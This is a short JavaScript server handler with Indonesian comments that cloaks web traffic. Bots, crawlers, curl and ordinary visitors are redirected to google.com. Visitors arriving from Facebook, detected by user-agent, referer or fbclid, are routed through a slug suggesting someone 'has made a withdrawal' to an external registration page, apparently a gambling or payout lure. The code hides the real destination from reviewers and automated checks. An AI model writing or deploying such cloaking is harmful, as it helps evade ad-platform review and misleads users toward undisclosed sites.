export default async function handler(req, res) {

  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const referer = (req.headers["referer"] || "").toLowerCase();
  const url = new URL(req.url, `https://${req.headers.host}`);

  const isBot =
    ua.includes("bot") ||
    ua.includes("crawl") ||
    ua.includes("spider") ||
    ua.includes("curl");

  const isFB =
    ua.includes("facebook") ||
    referer.includes("facebook") ||
    url.searchParams.has("fbclid");

  // ===== ROOT =====
  if (url.pathname === "/") {

    // BOT → white page
    if (isBot) {
      return res.writeHead(301, {
        Location: "https://www.google.com/"
      }).end();
    }

    // FB → masuk slug
    if (isFB) {
      return res.writeHead(302, {
        Location: "/dewi11-sudah-melakukan-wd-88775"
      }).end();
    }

    // user biasa → white
    return res.writeHead(301, {
      Location: "https://www.google.com/"
    }).end();
  }

  // ===== SLUG =====
  if (url.pathname === "/dewi11-sudah-melakukan-wd-88775") {

    return res.writeHead(302, {
      Location: "https://adsmenarik-dewi11.com/register"
    }).end();
  }

  // fallback
  return res.writeHead(404).end("Not Found");
}
